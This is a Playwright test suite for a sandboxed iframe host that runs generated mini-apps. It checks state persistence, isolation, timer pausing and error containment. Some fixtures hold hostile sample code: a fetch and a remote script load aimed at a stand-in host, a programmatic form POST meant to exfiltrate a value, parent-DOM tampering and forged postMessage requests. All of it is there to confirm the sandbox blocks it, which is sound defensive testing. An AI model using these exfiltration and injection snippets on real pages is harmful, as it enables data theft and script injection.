import { test, expect } from './test-fixture';
import { createServer, type ViteDevServer } from 'vite';
import react from '@vitejs/plugin-react';
import type { AddressInfo } from 'node:net';
import type { GeneratedAppPackage } from '../../src/apps/contracts';

declare global {
  interface Window {
    __hostTest: {
      mount(app?: GeneratedAppPackage, instanceId?: string): void;
      close(instanceId: string): void;
      active(instanceId: string, active: boolean): void;
      resize(): void;
      states: Map<string, Record<string, unknown>>;
      writes: { id: string; value: unknown }[];
      errors: string[];
      loadCalls: number;
    };
    mountToken: number;
    ticks: number;
    frames: number;
    timeoutFired: boolean;
    cspViolations: { blockedURI: string; effectiveDirective: string; disposition: string; originalPolicy: string }[];
    remoteExecuted: boolean;
    remoteScriptStatus: 'pending' | 'loaded' | 'error';
  }
}

let server: ViteDevServer;
let origin: string;
const harness = `
import React, { useState } from 'react';
import { createRoot } from 'react-dom/client';
import GeneratedAppHost from '/src/apps/generated/index.tsx';
import { retroTimerFixture } from '/src/apps/generated/retro-timer-fixture.ts';
const states = new Map();
const writes = [];
const errors = [];
let loadCalls = 0;
const bridges = new Map();
const bridge = id => {
  if (!bridges.has(id)) bridges.set(id, {
    listApps() { throw new Error('must not expose listApps'); },
    openApp() { throw new Error('must not expose openApp'); },
    setNote() { throw new Error('must not expose setNote'); },
    exportText() { throw new Error('must not expose exportText'); },
    loadState() { loadCalls++; return states.get(id) ?? null; },
    saveState(value) { states.set(id, structuredClone(value)); writes.push({ id, value: structuredClone(value) }); }
  });
  return bridges.get(id);
};
window.__hostTest = { states, writes, errors, get loadCalls() { return loadCalls; } };
function Harness() {
  const [items, setItems] = useState([]);
  const [width, setWidth] = useState(470);
  window.__hostTest.mount = (app = retroTimerFixture, instanceId = 'one') => setItems(old => [...old.filter(x => x.instanceId !== instanceId), { app, instanceId, active: true }]);
  window.__hostTest.close = id => setItems(old => old.filter(x => x.instanceId !== id));
  window.__hostTest.active = (id, active) => setItems(old => old.map(x => x.instanceId === id ? { ...x, active } : x));
  window.__hostTest.resize = () => setWidth(old => old === 470 ? 600 : 470);
  return <main><h1 id="parent-marker">Trusted parent</h1><button onClick={() => window.__hostTest.resize()}>Resize</button>
    <div id="windows" style={{ display:'flex', gap:16, flexWrap:'wrap' }}>{items.map(item => <div key={item.instanceId} data-instance={item.instanceId} style={{ width, height:510, position:'relative' }}>
      <GeneratedAppHost {...item} host={bridge(item.instanceId)} onError={message => errors.push(message)} />
    </div>)}</div></main>;
}
createRoot(document.getElementById('root')).render(<React.StrictMode><Harness /></React.StrictMode>);
`;

test.beforeAll(async () => {
  server = await createServer({
    configFile: false,
    root: process.cwd(),
    cacheDir: 'node_modules/.vite-generated-host-tests',
    optimizeDeps: { entries: [], noDiscovery: true, include: ['react', 'react-dom/client', 'react/jsx-dev-runtime'] },
    plugins: [react(), {
      name: 'generated-host-acceptance-only',
      resolveId(id) { if (id === '/__generated-host-harness.tsx') return id; },
      load(id) { if (id === '/__generated-host-harness.tsx') return harness; },
      configureServer(dev) {
        dev.middlewares.use('/__generated-host-test', async (_request, response, next) => {
          try {
            const html = await dev.transformIndexHtml('/__generated-host-test', '<!doctype html><html><head><meta charset="utf-8"></head><body><div id="root"></div><script type="module" src="/__generated-host-harness.tsx"></script></body></html>');
            response.setHeader('Content-Type', 'text/html'); response.end(html);
          } catch (error) { next(error); }
        });
      },
    }],
    server: { host: '127.0.0.1', port: 0, headers: { 'Content-Security-Policy': "frame-src 'self' blob:" } },
  });
  await server.listen();
  const address = server.httpServer?.address() as AddressInfo;
  origin = `http://127.0.0.1:${address.port}`;
});
test.afterAll(async () => { await server?.close(); });
test.beforeEach(async ({ page }) => {
  await page.goto(`${origin}/__generated-host-test`);
  await page.waitForFunction(() => typeof window.__hostTest?.mount === 'function');
});

function packageOf(js: string, html = '<output id="value">ready</output>', css = '') {
  return { id: 'acceptance-app', title: 'Acceptance App', html, css, js, initialState: {}, createdAt: '2026-09-27T00:00:00Z' };
}

test('retro timer starts, pauses, resets and restores a saved deadline', async ({ page }, info) => {
  await page.evaluate(() => window.__hostTest.mount());
  const frame = page.frameLocator('[data-instance="one"] iframe');
  await expect(frame.locator('#time')).toHaveText('25:00');
  await expect(frame.getByText('验收样例 · 非现场生成')).toBeVisible();
  await expect(page.locator('[data-instance="one"] [role="alert"]')).toHaveCount(0);
  expect(await page.evaluate(() => window.__hostTest.errors)).toEqual([]);
  await frame.locator('#duration').selectOption('1');
  await frame.locator('#start').click();
  await expect.poll(() => page.evaluate(() => window.__hostTest.states.get('one')?.running)).toBe(true);
  await expect(frame.locator('#time')).not.toHaveText('01:00');
  await frame.locator('#pause').click();
  await expect.poll(() => page.evaluate(() => window.__hostTest.states.get('one')?.running)).toBe(false);
  const paused = await frame.locator('#time').textContent();
  await page.evaluate(() => window.__hostTest.close('one'));
  await expect(page.locator('iframe')).toHaveCount(0);
  await page.evaluate(() => window.__hostTest.mount());
  await expect(frame.locator('#time')).toHaveText(paused!);
  await frame.locator('#start').click();
  await expect.poll(() => page.evaluate(() => window.__hostTest.states.get('one')?.running)).toBe(true);
  const deadline = await page.evaluate(() => window.__hostTest.states.get('one').deadline);
  await page.evaluate(() => window.__hostTest.close('one'));
  await expect(page.locator('iframe')).toHaveCount(0);
  await page.evaluate(() => window.__hostTest.mount());
  await expect(frame.locator('#mode')).toHaveText('FOCUS IN PROGRESS');
  expect(await page.evaluate(() => window.__hostTest.states.get('one').deadline)).toBe(deadline);
  await frame.locator('#reset').click();
  await expect(frame.locator('#time')).toHaveText('01:00');
  await expect(page.locator('[data-instance="one"] [role="alert"]')).toHaveCount(0);
  await page.screenshot({ path: info.outputPath('retro-timer.png') });
});

test('iframe isolates DOM/CSS/storage/network and exposes only instance state', async ({ page }) => {
  const outboundRequests: string[] = [];
  await page.route('https://example.invalid/**', async route => {
    outboundRequests.push(route.request().url());
    await route.fulfill({ contentType: 'application/javascript', body: 'window.remoteExecuted = true;' });
  });
  const app = packageOf(`
    (async () => {
      window.cspViolations = [];
      window.remoteExecuted = false;
      window.remoteScriptStatus = 'pending';
      addEventListener('securitypolicyviolation', event => {
        window.cspViolations.push({ blockedURI: event.blockedURI, effectiveDirective: event.effectiveDirective,
          disposition: event.disposition, originalPolicy: event.originalPolicy });
      });
      const result = { api: Object.keys(vibe).sort() };
      try { parent.document.getElementById('parent-marker').textContent = 'polluted'; result.dom = false; } catch { result.dom = true; }
      try { localStorage.setItem('escape', 'yes'); result.storage = false; } catch { result.storage = true; }
      try { await fetch('https://example.invalid/leak'); result.fetch = false; } catch { result.fetch = true; }
      const script = document.createElement('script');
      script.id = 'remote-script-attempt';
      script.nonce = document.querySelector('script[nonce]').nonce;
      script.src = 'https://example.invalid/leak-script';
      script.addEventListener('load', () => { window.remoteScriptStatus = 'loaded'; });
      script.addEventListener('error', () => { window.remoteScriptStatus = 'error'; });
      document.body.appendChild(script);
      await vibe.setState(result);
      document.getElementById('value').textContent = 'checked';
    })();`, '<style>body{background:red}</style><script>parent.injection=true</script><p id="value" onclick="parent.injection=true">ready</p><iframe src="https://example.invalid/frame"></iframe>', 'body{background:rgb(0, 0, 0);color:white}');
  await page.evaluate(app => window.__hostTest.mount(app), app);
  const frame = page.frameLocator('iframe');
  await expect(frame.locator('#value')).toHaveText('checked');
  await expect(page.locator('#parent-marker')).toHaveText('Trusted parent');
  const state = await page.evaluate(() => window.__hostTest.states.get('one'));
  expect(state).toEqual({ api: ['getState', 'onVisibilityChange', 'setState'], dom: true, storage: true, fetch: true });
  expect(await page.locator('body').evaluate(element => getComputedStyle(element).backgroundColor)).not.toBe('rgb(0, 0, 0)');
  await expect(frame.locator('#value')).not.toHaveAttribute('onclick');
  await expect(frame.locator('iframe')).toHaveCount(0);
  await expect(frame.locator('#remote-script-attempt')).toHaveAttribute('src', 'https://example.invalid/leak-script');
  // Network instrumentation may omit requestfailed or describe the failure
  // without "csp". Observe the enforced policy in the sandbox itself instead.
  // Cross-origin CSP reports are permitted to redact a blocked URL to its origin.
  await expect.poll(() => frame.locator('body').evaluate(() => window.cspViolations.some(event =>
    ['https://example.invalid/leak-script', 'https://example.invalid', 'https://example.invalid/'].includes(event.blockedURI)
    && ['script-src', 'script-src-elem'].includes(event.effectiveDirective)
    && event.disposition === 'enforce'
    && event.originalPolicy.includes("script-src 'unsafe-inline'"),
  ))).toBe(true);
  await expect.poll(() => frame.locator('body').evaluate(() => window.remoteScriptStatus)).toBe('error');
  expect(await frame.locator('body').evaluate(() => window.remoteExecuted)).toBe(false);
  expect(outboundRequests).toEqual([]);
});

test('local form submit handlers save instance state by click, requestSubmit and Enter', async ({ page }) => {
  const app = packageOf(`
    const form = document.getElementById('settings');
    let submits = 0;
    form.onsubmit = async event => {
      const preventedByHost = event.defaultPrevented;
      event.preventDefault();
      const minutes = Number(document.getElementById('minutes').value);
      await vibe.setState({ minutes, submits: ++submits, preventedByHost });
      document.getElementById('value').textContent = 'saved:' + minutes;
    };
  `, '<form id="settings"><label for="minutes">Minutes</label><input id="minutes" name="minutes" value="25"><button id="save" type="submit">Save settings</button></form><output id="value">ready</output>');
  await page.evaluate(app => window.__hostTest.mount(app), app);
  const frame = page.frameLocator('iframe');
  await expect(frame.locator('#value')).toHaveText('ready');
  const frameUrl = await frame.locator('body').evaluate(() => location.href);

  await frame.getByLabel('Minutes').fill('32');
  await frame.getByRole('button', { name: 'Save settings' }).click();
  await expect(frame.locator('#value')).toHaveText('saved:32');
  expect(await page.evaluate(() => window.__hostTest.states.get('one'))).toEqual({ minutes: 32, submits: 1, preventedByHost: true });

  await frame.getByLabel('Minutes').fill('18');
  await frame.locator('#settings').evaluate(form => (form as HTMLFormElement).requestSubmit());
  await expect(frame.locator('#value')).toHaveText('saved:18');

  await frame.getByLabel('Minutes').fill('7');
  await frame.getByLabel('Minutes').press('Enter');
  await expect(frame.locator('#value')).toHaveText('saved:7');
  expect(await page.evaluate(() => window.__hostTest.states.get('one'))).toEqual({ minutes: 7, submits: 3, preventedByHost: true });
  expect(await frame.locator('body').evaluate(() => location.href)).toBe(frameUrl);
  await expect(page.locator('[data-instance="one"] [role="alert"]')).toHaveCount(0);
});

test('programmatic form.submit cannot send external or same-origin data or navigate', async ({ page }) => {
  const targets = ['https://example.invalid/form-submit', `${origin}/__blocked-form-target`];
  const outboundRequests: string[] = [];
  await page.route('https://example.invalid/**', async route => {
    outboundRequests.push(route.request().url());
    await route.fulfill({ contentType: 'text/html', body: '<h1>UNEXPECTED FORM DELIVERY</h1>' });
  });
  await page.route('**/__blocked-form-target', async route => {
    outboundRequests.push(route.request().url());
    await route.fulfill({ contentType: 'text/html', body: '<h1>UNEXPECTED SAME-ORIGIN DELIVERY</h1>' });
  });
  const app = packageOf(`
    window.cspViolations = [];
    addEventListener('securitypolicyviolation', event => {
      window.cspViolations.push({ blockedURI: event.blockedURI, effectiveDirective: event.effectiveDirective,
        disposition: event.disposition, originalPolicy: event.originalPolicy });
    });
    document.getElementById('attack').addEventListener('click', () => {
      const form = document.createElement('form');
      form.action = document.getElementById('target').value;
      form.method = 'POST';
      const field = document.createElement('input');
      field.name = 'fixture'; field.value = 'must-not-leave-frame'; form.appendChild(field);
      document.body.appendChild(form);
      // The native submit() method bypasses submit event handlers, so CSP must
      // enforce containment even without the bootstrap's preventDefault.
      HTMLFormElement.prototype.submit.call(form);
    });
  `, '<input id="target" aria-label="Submission target"><button id="attack" type="button">Attempt direct submit</button><output id="value">still here</output>');
  await page.evaluate(app => window.__hostTest.mount(app), app);
  const frame = page.frameLocator('iframe');
  await expect(frame.locator('#value')).toHaveText('still here');
  const frameUrl = await frame.locator('body').evaluate(() => location.href);
  const parentUrl = page.url();
  const navigations: string[] = [];
  page.on('framenavigated', changed => navigations.push(changed.url()));
  for (const target of targets) {
    await frame.getByLabel('Submission target').fill(target);
    await frame.getByRole('button', { name: 'Attempt direct submit' }).click();
    await expect.poll(() => frame.locator('body').evaluate((_, target) => window.cspViolations.some(event =>
      [target, new URL(target).origin, new URL(target).origin + '/'].includes(event.blockedURI)
      && event.effectiveDirective === 'form-action'
      && event.disposition === 'enforce'
      && event.originalPolicy.includes("form-action 'none'"),
    ), target)).toBe(true);
    await expect(frame.locator('#value')).toHaveText('still here');
    expect(await frame.locator('body').evaluate(() => location.href)).toBe(frameUrl);
  }
  expect(outboundRequests).toEqual([]);
  expect(navigations).toEqual([]);
  expect(page.url()).toBe(parentUrl);
});

test('separate instances retain their own state and reject forged host messages', async ({ page }) => {
  const app = packageOf(`const state = vibe.getState(); document.getElementById('value').textContent = state.owner;`);
  await page.evaluate(app => {
    const host = window.__hostTest;
    host.states.set('one', { owner: 'one' }); host.states.set('two', { owner: 'two' });
    host.mount(app, 'one'); host.mount(app, 'two');
  }, app);
  await expect(page.frameLocator('[data-instance="one"] iframe').locator('#value')).toHaveText('one');
  await expect(page.frameLocator('[data-instance="two"] iframe').locator('#value')).toHaveText('two');
  await page.evaluate(() => {
    const one = document.querySelector<HTMLIFrameElement>('[data-instance="one"] iframe')!;
    const two = document.querySelector<HTMLIFrameElement>('[data-instance="two"] iframe')!;
    const nonce = one.srcdoc.match(/script nonce="([a-f0-9]+)"/)![1];
    const data = { channel: 'vibe-generated-v1', nonce, instanceId: 'one', id: 'm_50', type: 'request', method: 'setState', args: [{ owner: 'forged' }] };
    window.dispatchEvent(new MessageEvent('message', { source: two.contentWindow, data }));
    window.dispatchEvent(new MessageEvent('message', { source: one.contentWindow, data: { ...data, instanceId: 'two' } }));
    window.dispatchEvent(new MessageEvent('message', { source: one.contentWindow, data: { ...data, method: 'openApp', args: ['terminal'] } }));
  });
  expect(await page.evaluate(() => [...window.__hostTest.states.values()])).toEqual([{ owner: 'one' }, { owner: 'two' }]);
  expect(await page.evaluate(() => window.__hostTest.writes.length)).toBe(0);
});

test('resizing preserves the same document and hidden timers/frames pause', async ({ page }) => {
  const app = packageOf(`
    window.mountToken = Math.random(); window.ticks = 0; window.frames = 0; window.timeoutFired = false;
    setInterval(() => { window.ticks++; }, 30);
    const tick = () => { window.frames++; requestAnimationFrame(tick); }; requestAnimationFrame(tick);
    setTimeout(() => { window.timeoutFired = true; }, 1000);
    document.getElementById('value').textContent = 'running';
  `, '<input id="draft" aria-label="Draft"><output id="value"></output>');
  await page.evaluate(app => window.__hostTest.mount(app), app);
  const frame = page.frameLocator('iframe');
  await expect(frame.locator('#value')).toHaveText('running');
  await frame.locator('#draft').fill('keep this draft');
  const counters = () => frame.locator('body').evaluate(() => ({ token: window.mountToken, ticks: window.ticks, frames: window.frames }));
  await expect.poll(async () => (await counters()).ticks).toBeGreaterThan(1);
  const before = await counters();
  const loads = await page.evaluate(() => window.__hostTest.loadCalls);
  await page.getByRole('button', { name: 'Resize' }).click();
  await expect(frame.locator('#draft')).toHaveValue('keep this draft');
  expect((await counters()).token).toBe(before.token);
  expect(await page.evaluate(() => window.__hostTest.loadCalls)).toBe(loads);
  await page.evaluate(() => window.__hostTest.active('one', false));
  await expect(frame.locator('html')).toHaveAttribute('data-vibe-active', 'false');
  const paused = await counters();
  await frame.locator('body').evaluate(() => {
    window.timeoutFired = false;
    setTimeout(() => { window.timeoutFired = true; }, 60);
  });
  // The timed wait is the behavior under test: no interval/RAF callback may run.
  await page.waitForTimeout(180);
  expect(await counters()).toEqual(paused);
  expect(await frame.locator('body').evaluate(() => window.timeoutFired)).toBe(false);
  await page.evaluate(() => window.__hostTest.active('one', true));
  await expect.poll(async () => (await counters()).ticks).toBeGreaterThan(paused.ticks);
  await expect.poll(async () => (await counters()).frames).toBeGreaterThan(paused.frames);
  await expect.poll(() => frame.locator('body').evaluate(() => window.timeoutFired)).toBe(true);
});

test('closing releases callbacks, and runtime failures stay inside one app', async ({ page }) => {
  const app = packageOf(`setInterval(() => { void vibe.setState({ tick: Date.now() }); }, 30);`);
  await page.evaluate(app => window.__hostTest.mount(app), app);
  await expect.poll(() => page.evaluate(() => window.__hostTest.writes.length)).toBeGreaterThan(1);
  await page.evaluate(() => window.__hostTest.close('one'));
  await expect(page.locator('iframe')).toHaveCount(0);
  const writes = await page.evaluate(() => window.__hostTest.writes.length);
  await page.waitForTimeout(150);
  expect(await page.evaluate(() => window.__hostTest.writes.length)).toBe(writes);
  await page.evaluate(app => { window.__hostTest.mount(app, 'bad'); window.__hostTest.mount(undefined, 'good'); }, packageOf('throw new Error("fixture failure");'));
  await expect(page.locator('[data-instance="bad"] [role="alert"]')).toContainText('fixture failure');
  await expect(page.frameLocator('[data-instance="good"] iframe').locator('#time')).toHaveText('25:00');
  expect(await page.evaluate(() => window.__hostTest.errors.some((error: string) => error.includes('fixture failure')))).toBe(true);
});
